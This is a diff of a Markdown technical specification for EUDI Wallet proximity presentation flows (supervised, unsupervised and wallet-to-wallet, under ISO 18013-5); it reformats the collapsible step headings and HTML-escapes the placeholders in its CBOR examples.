 The User opens their EUDI Wallet app and navigates to the credential requested by the Agent. The Wallet should provide a "ready to present" mode that pre-selects the most commonly used credential (typically PID) and prepares the NFC interface. On some implementations, the User may simply hold their device near the Reader without explicitly opening the Wallet — the OS intercepts the NFC field and launches the Wallet automatically (similar to contactless payment UX).
 
 > **Credential selection**: If the User holds multiple credentials of the same type (e.g., a national PID and an mDL, both containing `family_name`), the Wallet should prompt the User to choose which credential to present. The selection happens before NFC engagement (step 4), ensuring the correct ephemeral keys are generated for the selected credential.
 
 </details>
-<details><summary><strong>3. Wallet Unit generates ephemeral EC key pair</strong></summary>
+<details>
+<summary><strong>3. Wallet Unit generates ephemeral EC key pair</strong></summary>
 
 The Wallet generates a fresh ephemeral Elliptic Curve key pair (P-256 / NIST Curve) for this specific transaction. The public key will be transmitted in the `DeviceEngagement` structure (step 4), and the private key will be used for ECDH key agreement (step 6, Wallet side). The key pair is:
 
@@ -8385,7 +8533,8 @@ The private key never leaves the device's secure enclave (WSCA/WSCD boundary). T
 **Audit Telemetry:** The Wallet Unit logs an `EPHEMERAL_KEY_GENERATED` event.
 
 </details>
-<details><summary><strong>4. User taps device on mdoc Reader via NFC (DeviceEngagement)</strong></summary>
+<details>
+<summary><strong>4. User taps device on mdoc Reader via NFC (DeviceEngagement)</strong></summary>
 
 The User taps their smartphone against the RP's mdoc Reader terminal. The Wallet transmits the `DeviceEngagement` structure via NFC short-field communication.
 
@@ -8394,7 +8543,7 @@ DeviceEngagement = {
   0: "1.0",                              ; version
   1: [                                    ; security
     1,                                    ; cipher suite 1 (EC P-256)
-    h'<mdoc ephemeral public key COSE_Key>'
+    h'&lt;mdoc ephemeral public key COSE_Key>'
   ],
   2: [                                    ; device retrieval methods
     [                                     ; BLE
@@ -8403,7 +8552,7 @@ DeviceEngagement = {
       {                                   ; BLE options
         0: true,                          ; peripheral server mode
         1: h'A1B2C3D4E5F6...',            ; UUID
-        10: h'<device address>'           ; peripheral address
+        10: h'&lt;device address>'           ; peripheral address
       }
     ]
   ]
@@ -8415,7 +8564,8 @@ DeviceEngagement = {
 **Audit Telemetry:** The Wallet Unit logs a `DEVICE_ENGAGEMENT_TRANSMITTED` event.
 
 </details>
-<details><summary><strong>5. mdoc Reader generates ephemeral EC key pair</strong></summary>
+<details>
+<summary><strong>5. mdoc Reader generates ephemeral EC key pair</strong></summary>
 
 The mdoc Reader terminal generates its own ephemeral P-256 key pair upon receiving the `DeviceEngagement`. The Reader's ephemeral public key will be transmitted to the Wallet inside the `SessionEstablishment` message (step 7), enabling both parties to perform the ECDH key agreement. Like the Wallet's key (step 3), this key pair is single-use and destroyed after the transaction.
 
@@ -8426,7 +8576,8 @@ The mdoc Reader terminal generates its own ephemeral P-256 key pair upon receivi
 **Audit Telemetry:** The mdoc Reader logs an `EPHEMERAL_KEY_GENERATED` event.
 
 </details>
-<details><summary><strong>6. mdoc Reader derives symmetric session keys via ECDH</strong></summary>
+<details>
+<summary><strong>6. mdoc Reader derives symmetric session keys via ECDH</strong></summary>
 
 The Reader performs ECDH key agreement using its private ephemeral key and the Wallet's ephemeral public key (received in step 4's `DeviceEngagement`). The shared secret is fed through HKDF (HMAC-based Key Derivation Function) with the `SessionTranscript` as context to derive two symmetric keys (ISO 18013-5 §10.1.1.5):
 
@@ -8440,7 +8591,8 @@ The `SessionTranscript` is a CBOR array containing: `[DeviceEngagementBytes, ERe
 **Audit Telemetry:** The mdoc Reader logs a `SESSION_KEYS_DERIVED` event.
 
 </details>
-<details><summary><strong>7. mdoc Reader sends encrypted DeviceRequest over BLE</strong></summary>
+<details>
+<summary><strong>7. mdoc Reader sends encrypted DeviceRequest over BLE</strong></summary>
 
 The mdoc Reader switches to the Bluetooth Low Energy (BLE) channel advertised in the engagement payload and transmits the `SessionEstablishment` message along with the AES-GCM encrypted `DeviceRequest`.
 
@@ -8449,7 +8601,7 @@ DeviceRequest = {
   "version": "1.0",
   "docRequests": [
     {
-      "itemsRequest": 24(<<              ; CBOR tag 24: embedded CBOR
+      "itemsRequest": 24(&lt;<              ; CBOR tag 24: embedded CBOR
         {                                 ; ItemsRequest
           "docType": "eu.europa.ec.eudi.pid.1",
           "nameSpaces": {
@@ -8466,12 +8618,12 @@ DeviceRequest = {
         h'a10126',                        ; protected: {1: -7} (ES256)
         {                                 ; unprotected
           33: [                           ; x5chain: WRPAC chain
-            h'<WRPAC certificate DER>',
-            h'<Access CA intermediate DER>'
+            h'&lt;WRPAC certificate DER>',
+            h'&lt;Access CA intermediate DER>'
           ]
         },
         nil,                              ; detached payload
-        h'<WRPAC signature over ItemsRequest>'
+        h'&lt;WRPAC signature over ItemsRequest>'
       ]
     }
   ]
@@ -8483,7 +8635,8 @@ DeviceRequest = {
 **Audit Telemetry:** The mdoc Reader logs an `ENCRYPTED_DEVICE_REQUEST_DISPATCHED` event.
 
 </details>
-<details><summary><strong>8. Wallet Unit decrypts incoming DeviceRequest</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit decrypts incoming DeviceRequest</strong></summary>
 
 The Wallet performs the same ECDH + HKDF key derivation as the Reader (step 6), using its own ephemeral private key and the Reader's ephemeral public key (received in the `SessionEstablishment` message). The Wallet uses the derived `SKReader` key to decrypt the AES-256-GCM encrypted `DeviceRequest`. The `SessionTranscript` serves as additional authenticated data (AAD), ensuring the ciphertext is bound to this specific session.
 
@@ -8494,7 +8647,8 @@ The Wallet performs the same ECDH + HKDF key derivation as the Reader (step 6), 
 **Audit Telemetry:** The Wallet Unit logs a `DEVICE_REQUEST_DECRYPTED` event (or `DEVICE_REQUEST_DECRYPTION_FAILED` on failure).
 
 </details>
-<details><summary><strong>9. Wallet Unit verifies ReaderAuth COSE_Sign1 signature (WRPAC)</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit verifies ReaderAuth COSE_Sign1 signature (WRPAC)</strong></summary>
 
 The Wallet verifies the `readerAuth` COSE_Sign1 signature from the `DeviceRequest` (step 7). The verification process:
 
@@ -8512,7 +8666,8 @@ The `readerAuth` is the mdoc equivalent of the JAR signature in OpenID4VP — it
 > **readerAuth is optional in ISO 18013-5 but mandatory in EUDI**: The ARF requires Reader Authentication (via WRPAC) for all RP-to-Wallet interactions. Without `readerAuth`, the Wallet would have no way to verify which RP is requesting credentials.
 
 </details>
-<details><summary><strong>10. Wallet Unit validates WRPAC certificate chain via LoTE</strong></summary>
+<details>
+<summary><strong>10. Wallet Unit validates WRPAC certificate chain via LoTE</strong></summary>
 
 The Wallet validates the WRPAC certificate chain (extracted in step 9) against the Access CA trust anchor from the national LoTE. The validation follows the same 5-step process as §9.2 step 9:
 
@@ -8528,7 +8683,8 @@ For proximity flows, the Wallet may be operating with **limited or no internet c
 **Audit Telemetry:** The Wallet Unit logs a `WRPAC_CHAIN_VALIDATED` event.
 
 </details>
-<details><summary><strong>11. Wallet Unit checks WRPAC revocation status</strong></summary>
+<details>
+<summary><strong>11. Wallet Unit checks WRPAC revocation status</strong></summary>
 
 The Wallet checks whether the Reader terminal's WRPAC has been revoked via OCSP or CRL, identical to §9.2 step 10. In proximity scenarios, two challenges arise:
 
@@ -8540,7 +8696,8 @@ The Wallet checks whether the Reader terminal's WRPAC has been revoked via OCSP 
 **Audit Telemetry:** The Wallet Unit logs a `WRPAC_REVOCATION_CHECKED` event.
 
 </details>
-<details><summary><strong>12. Wallet Unit displays consent screen to User</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit displays consent screen to User</strong></summary>
 
 The Wallet displays a consent screen showing the Reader terminal's verified identity and the specifically requested attributes. In supervised proximity flows, the consent screen typically includes:
 
@@ -8552,14 +8709,16 @@ The Wallet displays a consent screen showing the Reader terminal's verified iden
 The consent screen appears on the User's smartphone while the Agent waits. In high-throughput supervised scenarios (e.g., border control), the User should be able to approve quickly — the Wallet should pre-expand the attribute list rather than requiring interaction to view it.
 
 </details>
-<details><summary><strong>13. User approves attribute disclosure</strong></summary>
+<details>
+<summary><strong>13. User approves attribute disclosure</strong></summary>
 
 The User reviews the consent screen and taps to approve sharing the listed attributes. In supervised flows, the User is aware that the Agent will perform a visual comparison (steps 21–22), so the `portrait` attribute is typically expected. Unlike remote flows, the User cannot selectively deselect individual attributes in many mdoc Wallet implementations — the consent is all-or-nothing for the requested `nameSpaces`.
 
 **Failure Path:** If the User denies consent, the Wallet Unit gracefully sends a `DeviceResponse` with `status: 10` (general error) and terminates the BLE session. The Agent may ask the User to present a physical document instead.
 
 </details>
-<details><summary><strong>14. Wallet Unit authenticates User via WSCA/WSCD</strong></summary>
+<details>
+<summary><strong>14. Wallet Unit authenticates User via WSCA/WSCD</strong></summary>
 
 The Wallet requires the User to authenticate via the device's WSCA (Wallet Secure Cryptographic Application) to unlock the credential's device key for signing. The authentication method (biometric or PIN) depends on the device configuration and the LoA required. The WSCA operates within the WSCD (Wallet Secure Cryptographic Device) boundary — typically the device's TEE (Trusted Execution Environment) or SE (Secure Element):
 
@@ -8571,7 +8730,8 @@ The WSCA authorises a single `COSE_Sign1` operation (step 15) and immediately re
 **Artifact Produced:** User Authentication Token / Biometric Match
 
 </details>
-<details><summary><strong>15. Wallet Unit builds DeviceResponse with DeviceAuth signature</strong></summary>
+<details>
+<summary><strong>15. Wallet Unit builds DeviceResponse with DeviceAuth signature</strong></summary>
 
 The Wallet constructs the `DeviceResponse` CBOR structure containing: (a) the issuer-signed attributes (`issuerSigned.nameSpaces`) with their per-element random salts, and (b) the `deviceAuth.deviceSignature` — a COSE_Sign1 over the `DeviceAuthentication` CBOR structure.
 
@@ -8589,7 +8749,8 @@ DeviceAuthentication = [
 The Wallet signs this structure using the credential's device key (the key bound to the MSO's `deviceKeyInfo`) via the WSCA. The Reader will verify this signature (step 20) to confirm that the presenting device possesses the private key that the PID Provider originally bound to the credential during issuance.
 
 </details>
-<details><summary><strong>16. Wallet Unit transmits encrypted DeviceResponse over BLE</strong></summary>
+<details>
+<summary><strong>16. Wallet Unit transmits encrypted DeviceResponse over BLE</strong></summary>
 
 The Wallet fully encrypts the `DeviceResponse` CBOR structure using the symmetric session key and transmits it back to the Reader over BLE.
 
@@ -8618,7 +8779,7 @@ DeviceResponse = {
               "digestID": 2,
               "random": h'1234567890abcdef',
               "elementIdentifier": "portrait",
-              "elementValue": h'<JPEG portrait bytes>'
+              "elementValue": h'&lt;JPEG portrait bytes>'
             },
             {
               "digestID": 3,
@@ -8631,8 +8792,8 @@ DeviceResponse = {
         "issuerAuth": [                   ; COSE_Sign1 (MSO)
           h'a10126',                      ; protected: ES256
           {},                             ; unprotected
-          h'<MobileSecurityObject CBOR>', ; MSO with digests + validity
-          h'<PID Provider signature>'     ; signature
+          h'&lt;MobileSecurityObject CBOR>', ; MSO with digests + validity
+          h'&lt;PID Provider signature>'     ; signature
         ]
       },
       "deviceSigned": {
@@ -8642,7 +8803,7 @@ DeviceResponse = {
             h'a10126',                    ; protected: ES256
             {},                           ; unprotected
             nil,                          ; detached: SessionTranscript
-            h'<device key signature>'     ; over SessionTranscript
+            h'&lt;device key signature>'     ; over SessionTranscript
           ]
         }
       }
@@ -8657,7 +8818,8 @@ DeviceResponse = {
 **Audit Telemetry:** The Wallet Unit logs an `ENCRYPTED_DEVICE_RESPONSE_DISPATCHED` event.
 
 </details>
-<details><summary><strong>17. mdoc Reader decrypts DeviceResponse</strong></summary>
+<details>
+<summary><strong>17. mdoc Reader decrypts DeviceResponse</strong></summary>
 
 The Reader decrypts the `DeviceResponse` using `SKDevice` — the symmetric key derived in step 6 from the ECDH key agreement. The decryption uses AES-256-GCM with the `SessionTranscript` as additional authenticated data (AAD). Upon successful decryption, the Reader obtains the plaintext CBOR containing the `documents` array with the issuer-signed attributes and device authentication data.
 
@@ -8670,7 +8832,8 @@ The Reader decrypts the `DeviceResponse` using `SKDevice` — the symmetric key 
 **Audit Telemetry:** The mdoc Reader logs a `DEVICE_RESPONSE_DECRYPTED` event.
 
 </details>
-<details><summary><strong>18. mdoc Reader verifies IssuerAuth MSO signature</strong></summary>
+<details>
+<summary><strong>18. mdoc Reader verifies IssuerAuth MSO signature</strong></summary>
 
 The Reader verifies the `issuerAuth` COSE_Sign1 signature within the `DeviceResponse`. This is the mdoc equivalent of SD-JWT issuer signature verification — it proves the credential was legitimately issued by a notified PID Provider:
 
@@ -8687,7 +8850,8 @@ In online-connected supervised terminals, the Reader can perform the LoTE lookup
 **Audit Telemetry:** The mdoc Reader logs an `ISSUER_AUTH_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>19. mdoc Reader verifies data element digests</strong></summary>
+<details>
+<summary><strong>19. mdoc Reader verifies data element digests</strong></summary>
 
 For each `IssuerSignedItem` in the `issuerSigned.nameSpaces`, the Reader verifies that the attribute value was not tampered with after issuance. The verification process (ISO 18013-5 §10.3.1):
 
@@ -8703,7 +8867,8 @@ This per-element digest verification enables **selective disclosure** in the mdo
 **Audit Telemetry:** The mdoc Reader logs a `DATA_ELEMENT_DIGESTS_VERIFIED` event.
 
 </details>
-<details><summary><strong>20. mdoc Reader verifies DeviceAuth signature over SessionTranscript</strong></summary>
+<details>
+<summary><strong>20. mdoc Reader verifies DeviceAuth signature over SessionTranscript</strong></summary>
 
 The Reader verifies the `deviceSignature` COSE_Sign1 to prove the presenting device possesses the private key bound to this credential at issuance. The verification:
 
@@ -8718,7 +8883,8 @@ This is the mdoc equivalent of KB-JWT verification in SD-JWT VC — it proves: (
 **Audit Telemetry:** The mdoc Reader logs a `DEVICE_AUTH_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>21. mdoc Reader displays portrait and verified attributes to RP Agent</strong></summary>
+<details>
+<summary><strong>21. mdoc Reader displays portrait and verified attributes to RP Agent</strong></summary>
 
 Once all cryptographic verifications pass (steps 18–20), the Reader terminal renders the verified attributes on the Agent's screen. The display includes:
 
@@ -8730,7 +8896,8 @@ Once all cryptographic verifications pass (steps 18–20), the Reader terminal r
 The terminal display should be positioned so that only the Agent can see it — showing the User's portrait and personal data on a public-facing screen would violate privacy principles. Some terminal implementations use a secondary screen visible only from the Agent's position.
 
 </details>
-<details><summary><strong>22. RP Agent visually compares portrait against User</strong></summary>
+<details>
+<summary><strong>22. RP Agent visually compares portrait against User</strong></summary>
 
 The Agent performs the **human-in-the-loop identity binding** that distinguishes supervised from unsupervised flows. The Agent visually compares the displayed high-resolution portrait photograph against the physical appearance of the User standing before them. This visual check verifies what cryptography alone cannot — that the person operating the device is the same person whose PID was issued by the PID Provider.
 
@@ -8744,7 +8911,8 @@ The visual comparison addresses threats that device-binding alone cannot mitigat
 **Audit Telemetry:** The mdoc Reader terminal logs a `VISUAL_COMPARISON_INITIATED` event, recording the start of the human-in-the-loop validation window.
 
 </details>
-<details><summary><strong>23. RP Agent confirms identity match on terminal</strong></summary>
+<details>
+<summary><strong>23. RP Agent confirms identity match on terminal</strong></summary>
 
 The Agent taps "Confirm" on the terminal to record that the visual comparison was successful. This confirmation has dual significance:
 
@@ -8856,26 +9024,30 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User approaches Automated Terminal</strong></summary>
+<details>
+<summary><strong>1. User approaches Automated Terminal</strong></summary>
 
 The User approaches the Relying Party's automated terminal — an unattended device such as an e-gate at an airport, an age-verification turnstile at a venue, a vending machine for age-restricted goods, or a self-service kiosk. Unlike the supervised flow (§13.4) where a human RP Agent mediates the transaction, the unsupervised terminal operates autonomously: it must complete the entire verification pipeline, make the access decision, and provide feedback without human oversight. This means the terminal's software must handle all error cases gracefully, since there is no agent to fall back to (see §13.11 for online fallback strategies).
 
 </details>
-<details><summary><strong>2. Automated Terminal displays "Tap your device" prompt</strong></summary>
+<details>
+<summary><strong>2. Automated Terminal displays "Tap your device" prompt</strong></summary>
 
 The terminal detects the User's presence (via proximity sensor, motion detection, or button press) and displays a visual prompt: *"Tap your device to verify"*. This prompt must comply with EN 301 549 accessibility requirements (§13.12): it should use large, high-contrast text, be accompanied by an audio cue for visually impaired Users, and include a pictogram showing where to tap. The NFC reader area should be clearly marked with the standard NFC contactless symbol (ISO/IEC 18092). The terminal also begins advertising its BLE service UUID to allow Wallet Units that detect the advertisement to pre-initiate the connection.
 
 **Audit Telemetry:** The Automated Terminal logs an `UNSUPERVISED_VERIFICATION_INITIATED` event.
 
 </details>
-<details><summary><strong>3. User opens Wallet Unit</strong></summary>
+<details>
+<summary><strong>3. User opens Wallet Unit</strong></summary>
 
 The User opens their EUDI Wallet application and navigates to the credential they expect to present (e.g., PID for age verification, mDL for driving privilege check). On some platforms, the Wallet may activate automatically when the device detects an NFC field from the terminal — this "tap-first, open-second" UX depends on the Wallet Provider's implementation and the OS's NFC dispatch behaviour (Android HCE vs. iOS Core NFC). The Wallet enters the mdoc "device" role (ISO 18013-5 §9.3.3.1.2), ready to receive a DeviceEngagement handshake.
 
 > **UX consideration**: For unsupervised flows, the User has no RP Agent to guide them. The Wallet's UI should clearly indicate which credential is about to be presented and to which type of terminal (using the terminal's WRPAC identity if available at this stage).
 
 </details>
-<details><summary><strong>4. Wallet Unit transmits DeviceEngagement via NFC tap</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit transmits DeviceEngagement via NFC tap</strong></summary>
 
 The User taps their device on the terminal's NFC reader. The Wallet transmits the `DeviceEngagement` CBOR structure (ISO 18013-5 §10.1.1.4) via NFC, containing its ephemeral public key and BLE connection parameters:
 
@@ -8884,7 +9056,7 @@ DeviceEngagement = {
   0: "1.0",                              ; version
   1: [                                    ; security
     1,                                    ; cipher suite 1 (EC P-256)
-    h'<mdoc ephemeral public key COSE_Key>'
+    h'&lt;mdoc ephemeral public key COSE_Key>'
   ],
   2: [                                    ; device retrieval methods
     [                                     ; BLE
@@ -8893,7 +9065,7 @@ DeviceEngagement = {
       {                                   ; BLE options
         0: true,                          ; peripheral server mode
         1: h'A1B2C3D4E5F6...',            ; UUID
-        10: h'<device address>'           ; peripheral address
+        10: h'&lt;device address>'           ; peripheral address
       }
     ]
   ]
@@ -8907,7 +9079,8 @@ This is identical to the supervised flow (§13.4 step 4). The NFC tap serves a d
 **Audit Telemetry:** The Wallet Unit logs a `DEVICE_ENGAGEMENT_TRANSMITTED` event.
 
 </details>
-<details><summary><strong>5. Automated Terminal generates ephemeral EC key pair</strong></summary>
+<details>
+<summary><strong>5. Automated Terminal generates ephemeral EC key pair</strong></summary>
 
 The terminal generates a fresh EC P-256 ephemeral key pair for this specific session (ISO 18013-5 §10.1.1.5). This key pair is used only for the ECDH key agreement in step 6 and is discarded after the session ends. The terminal's secure element or HSM should generate the key — software-only key generation on embedded terminals is acceptable for low-security use cases (age gates) but not for high-security deployments (e-gates, KYC kiosks).
 
@@ -8918,7 +9091,8 @@ The terminal generates a fresh EC P-256 ephemeral key pair for this specific ses
 **Audit Telemetry:** The Automated Terminal logs an `EPHEMERAL_KEY_GENERATED` event.
 
 </details>
-<details><summary><strong>6. Automated Terminal derives symmetric session keys via ECDH</strong></summary>
+<details>
+<summary><strong>6. Automated Terminal derives symmetric session keys via ECDH</strong></summary>
 
 The terminal performs ECDH key agreement (ISO 18013-5 §10.1.1.5) by combining its ephemeral private key with the Wallet's ephemeral public key (received in step 4) to produce a shared secret `Z`. It then derives two symmetric AES-256 session keys via HKDF-SHA-256 (RFC 5869):
 
@@ -8932,7 +9106,8 @@ The HKDF `info` parameter includes the `SessionTranscript` (ISO 18013-5 §10.1.5
 **Audit Telemetry:** The Automated Terminal logs a `SESSION_KEYS_DERIVED` event.
 
 </details>
-<details><summary><strong>7. Automated Terminal sends encrypted DeviceRequest over BLE</strong></summary>
+<details>
+<summary><strong>7. Automated Terminal sends encrypted DeviceRequest over BLE</strong></summary>
 
 The terminal establishes the BLE connection using the UUID from the DeviceEngagement (step 4) and sends an AES-GCM encrypted `DeviceRequest` (ISO 18013-5 §9.3.2.1.2). For an unsupervised age-verification terminal, the request typically asks for a minimal attribute set:
 
@@ -8941,7 +9116,7 @@ DeviceRequest = {
   "version": "1.0",
   "docRequests": [
     {
-      "itemsRequest": 24(<<              ; CBOR tag 24: embedded CBOR
+      "itemsRequest": 24(&lt;<              ; CBOR tag 24: embedded CBOR
         {                                 ; ItemsRequest
           "docType": "eu.europa.ec.eudi.pid.1",
           "nameSpaces": {
@@ -8955,12 +9130,12 @@ DeviceRequest = {
         h'a10126',                        ; protected: {1: -7} (ES256)
         {                                 ; unprotected
           33: [                           ; x5chain: WRPAC chain
-            h'<terminal WRPAC DER>',
-            h'<Access CA intermediate DER>'
+            h'&lt;terminal WRPAC DER>',
+            h'&lt;Access CA intermediate DER>'
           ]
         },
         nil,                              ; detached payload
-        h'<WRPAC signature over ItemsRequest>'
+        h'&lt;WRPAC signature over ItemsRequest>'
       ]
     }
   ]
@@ -8974,7 +9149,8 @@ Key differences from the supervised flow (§13.4 step 7): (1) the request is typ
 **Audit Telemetry:** The Automated Terminal logs an `ENCRYPTED_DEVICE_REQUEST_DISPATCHED` event.
 
 </details>
-<details><summary><strong>8. Wallet Unit verifies WRPAC certificate chain via LoTE</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit verifies WRPAC certificate chain via LoTE</strong></summary>
 
 The Wallet Unit extracts the WRPAC certificate chain from the `readerAuth` (step 7) and validates it against the national LoTE trust anchors (§5.5.3). The chain typically consists of the terminal's leaf WRPAC → Access CA intermediate → LoTE root. The Wallet verifies each certificate's signature, checks validity periods, and confirms the chain terminates at a LoTE-listed trust anchor.
 
@@ -8985,7 +9161,8 @@ The Wallet Unit extracts the WRPAC certificate chain from the `readerAuth` (step
 **Audit Telemetry:** The Wallet Unit logs a `WRPAC_CHAIN_VALIDATED` event.
 
 </details>
-<details><summary><strong>9. Wallet Unit displays consent prompt to User</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit displays consent prompt to User</strong></summary>
 
 The Wallet displays a consent screen showing the terminal's verified identity (extracted from the WRPAC — e.g., *"Supermarket Berlin — Tobacco Vending Machine"*), the specific data requested (`age_over_18`), and the `IntentToRetain` status (`false` — data will not be stored). For unsupervised flows, the consent UX must be optimised for speed — the User is standing at a terminal, possibly in a queue, and expects a sub-5-second interaction. The Wallet should:
 
@@ -8996,7 +9173,8 @@ The Wallet displays a consent screen showing the terminal's verified identity (e
 > **Accessibility**: The consent screen should support VoiceOver/TalkBack for visually impaired Users, and the approval gesture should be configurable (biometric, PIN, or device unlock depending on User preference — see §13.12).
 
 </details>
-<details><summary><strong>10. User approves via biometric or PIN</strong></summary>
+<details>
+<summary><strong>10. User approves via biometric or PIN</strong></summary>
 
 The User approves the data release by authenticating locally via biometric (fingerprint, FaceID) or device PIN. This user verification step proves "possession + inherence" (or "possession + knowledge") — the Wallet Unit only releases the credential after confirming the authorised User is physically present. The authentication happens via the WSCA/WSCD (unlike the WebAuthn pseudonym flow in §16.6 which uses OS-level authentication), because the credential being presented is an eIDAS-governed attestation (PID) that requires the full eIDAS trust chain.
 
@@ -9005,7 +9183,8 @@ The User approves the data release by authenticating locally via biometric (fing
 **Artifact Produced:** User Authentication Token / Biometric Match
 
 </details>
-<details><summary><strong>11. Wallet Unit transmits encrypted DeviceResponse over BLE</strong></summary>
+<details>
+<summary><strong>11. Wallet Unit transmits encrypted DeviceResponse over BLE</strong></summary>
 
 The Wallet constructs the `DeviceResponse` CBOR structure (ISO 18013-5 §9.3.2.1.2.2), containing only the approved attribute(s) and the `DeviceAuth` proof of possession. For the age-verification use case, the response contains a single data element:
 
@@ -9018,20 +9197,20 @@ DeviceResponse = {
       "issuerSigned": {
         "nameSpaces": {                   ; tagged CBOR ByteStrings
           "eu.europa.ec.eudi.pid.1": [
-            24(<< {                       ; IssuerSignedItem
+            24(&lt;< {                       ; IssuerSignedItem
               "digestID": 7,              ; matches MSO ValueDigests
-              "random": h'<random salt>',
+              "random": h'&lt;random salt>',
               "elementIdentifier": "age_over_18",
               "elementValue": true
             } >>)
           ]
         },
-        "issuerAuth": <COSE_Sign1>        ; MSO signed by PID Provider
+        "issuerAuth": &lt;COSE_Sign1>        ; MSO signed by PID Provider
       },
       "deviceSigned": {
-        "nameSpaces": 24(<<{}>>),         ; empty — no device-signed elements
+        "nameSpaces": 24(&lt;<{}>>),         ; empty — no device-signed elements
         "deviceAuth": {
-          "deviceSignature": <COSE_Sign1> ; signed over SessionTranscript
+          "deviceSignature": &lt;COSE_Sign1> ; signed over SessionTranscript
         }
       }
     }
@@ -9047,7 +9226,8 @@ The Wallet encrypts this payload with `SKDevice` (the session key derived in ste
 **Audit Telemetry:** The Wallet Unit logs an `ENCRYPTED_DEVICE_RESPONSE_DISPATCHED` event.
 
 </details>
-<details><summary><strong>12. Automated Terminal verifies IssuerAuth MSO signature</strong></summary>
+<details>
+<summary><strong>12. Automated Terminal verifies IssuerAuth MSO signature</strong></summary>
 
 The terminal decrypts the BLE payload using `SKDevice`, parses the `DeviceResponse`, and verifies the `issuerAuth` COSE_Sign1 signature in the Mobile Security Object (MSO). This confirms that the PID Provider (e.g., Bundesdruckerei) actually issued this credential. The terminal:
 
@@ -9063,7 +9243,8 @@ The terminal decrypts the BLE payload using `SKDevice`, parses the `DeviceRespon
 **Audit Telemetry:** The Automated Terminal logs an `ISSUER_AUTH_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>13. Automated Terminal verifies DeviceAuth signature</strong></summary>
+<details>
+<summary><strong>13. Automated Terminal verifies DeviceAuth signature</strong></summary>
 
 The terminal verifies the `deviceSignature` COSE_Sign1 (ISO 18013-5 §10.1.3.6) to prove that the credential was presented by the Wallet Unit that holds the corresponding private key — preventing credential cloning and relay attacks. The verification process:
 
@@ -9078,7 +9259,8 @@ If the signature verifies, it proves: (a) the Wallet possesses the private key b
 **Audit Telemetry:** The Automated Terminal logs a `DEVICE_AUTH_SIGNATURE_VERIFIED` event.
 
 </details>
-<details><summary><strong>14. Automated Terminal evaluates access policy (age_over_18)</strong></summary>
+<details>
+<summary><strong>14. Automated Terminal evaluates access policy (age_over_18)</strong></summary>
 
 The terminal's embedded policy engine evaluates the cryptographically verified attribute against its local access rule. For the typical age-verification use case, the policy is a simple boolean check:
 
@@ -9096,7 +9278,8 @@ More complex terminals (e-gates, customs kiosks) may evaluate compound policies 
 **Audit Telemetry:** The Automated Terminal logs an `ACCESS_POLICY_EVALUATED` event.
 
 </details>
-<details><summary><strong>15. Automated Terminal grants or denies access</strong></summary>
+<details>
+<summary><strong>15. Automated Terminal grants or denies access</strong></summary>
 
 Based on the policy evaluation result, the terminal executes the physical access decision:
 
@@ -9108,7 +9291,8 @@ Based on the policy evaluation result, the terminal executes the physical access
 **Audit Telemetry:** The Automated Terminal logs an `ACCESS_DECISION_EXECUTED` event.
 
 </details>
-<details><summary><strong>16. Automated Terminal provides visual feedback to User</strong></summary>
+<details>
+<summary><strong>16. Automated Terminal provides visual feedback to User</strong></summary>
 
 The terminal provides immediate, multi-modal feedback to the User (per EN 301 549 accessibility requirements — §13.12):
 
@@ -9256,7 +9440,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Verifier User activates W2W mode</strong></summary>
+<details>
+<summary><strong>1. Verifier User activates W2W mode</strong></summary>
 
 The Verifier User manually toggles their EUDI Wallet into Wallet-to-Wallet (W2W) mode via a dedicated menu option. This mode transforms the Wallet into a mobile mdoc Reader (ISO 18013-5 §9.3.3) — the same role that a stationary RP terminal plays in supervised proximity flows (§13.4), but running on a citizen's smartphone instead of dedicated hardware. The W2W feature is defined in TS9 and is the only mechanism that allows a natural person (not a registered RP) to verify another person's credentials.
 
@@ -9265,54 +9450,62 @@ The Verifier User manually toggles their EUDI Wallet into Wallet-to-Wallet (W2W)
 **Audit Telemetry:** The Verifier Wallet logs a `W2W_VERIFIER_MODE_ACTIVATED` event.
 
 </details>
-<details><summary><strong>2. Verifier Wallet displays a mandatory trust warning</strong></summary>
+<details>
+<summary><strong>2. Verifier Wallet displays a mandatory trust warning</strong></summary>
 
 Before allowing verification, the Verifier Wallet displays a mandatory security warning: *"Wallet-to-Wallet verification should only be used with natural persons you trust. The person presenting their credentials will not be able to verify your identity."* This warning is a regulatory countermeasure to prevent W2W from being abused as a data harvesting channel — since the Verifier has no WRPAC (STS9_30), the Holder cannot cryptographically authenticate the Verifier's identity.
 
 The warning must be displayed on every W2W session — it cannot be dismissed permanently or hidden behind a "don't show again" toggle. This ensures informed consent from both parties in every interaction.
 
 </details>
-<details><summary><strong>3. Verifier User selects the Verifier role</strong></summary>
+<details>
+<summary><strong>3. Verifier User selects the Verifier role</strong></summary>
 
 The Verifier User explicitly selects the "Verifier" role, which initialises the BLE peripheral listener and (optionally) the NFC reader interface. The Wallet begins advertising its BLE service UUID so the Holder's device can discover it after the QR code scan (step 10). The Verifier's device now waits for the Holder to initiate the engagement.
 
 > **Rate limiting**: The Wallet enforces per-device rate limits (STS9_31/32) — max 5 requests per hour, 20 per day, and 50 per week (sliding windows). This prevents a compromised or malicious Wallet from mass-querying credentials. If the rate limit is exceeded, the Wallet refuses to enter Verifier mode.
 
 </details>
-<details><summary><strong>4. Holder User activates W2W mode</strong></summary>
+<details>
+<summary><strong>4. Holder User activates W2W mode</strong></summary>
 
 In parallel, the Holder User activates the W2W module in their own Wallet. The Holder's experience is similar to standard proximity presentation (§13.4 step 2), but with the critical awareness that the Verifier is a natural person — not a registered RP with institutional accountability. This distinction is reinforced by the warning in step 5.
 
 **Audit Telemetry:** The Holder Wallet logs a `W2W_HOLDER_MODE_ACTIVATED` event.
 
 </details>
-<details><summary><strong>5. Holder Wallet displays a mandatory trust warning</strong></summary>
+<details>
+<summary><strong>5. Holder Wallet displays a mandatory trust warning</strong></summary>
 
